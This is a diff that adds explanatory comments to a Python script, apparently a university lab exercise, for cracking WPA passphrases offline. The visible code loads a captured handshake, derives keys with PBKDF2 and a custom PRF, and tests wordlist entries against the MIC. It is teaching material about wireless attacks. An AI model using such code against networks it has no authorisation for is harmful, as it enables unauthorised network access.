@@ -13,6 +13,7 @@ __email__ 		= "abraham.rubinstein@heig-vd.ch"
 __status__ 		= "Prototype"
 
 
+# Imports
 from pbkdf2 import pbkdf2
 import hmac
 from hashlib import sha1
@@ -37,7 +38,7 @@ def customPRF512(key, A, B):
     return state[:blen]
 
 
-# Previous packet
+# Loading parameters from the .pcap file
 wpa         = rdpcap("wpa_handshake.cap")
 A           = "Pairwise key expansion"
 ssid        = str.encode(wpa[0][Dot11Beacon].network_stats()['ssid'])
@@ -50,6 +51,7 @@ B           = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce
 data        = raw(wpa[8])[48:]
 
 
+# Function used to check candidate key
 def check(k):
     k = str.encode(k)
     pmk = pbkdf2(sha1, k, ssid, 4096, 32)
@@ -58,6 +60,7 @@ def check(k):
     return guess_mic.digest()[:16] == target_mic
 
 
+# Use wordlist to attack the MIC
 num_lines = sum(1 for line in open(argv[1]))
 print(f"Line count in wordlist : {num_lines}")
 with open(argv[1], 'r') as file:
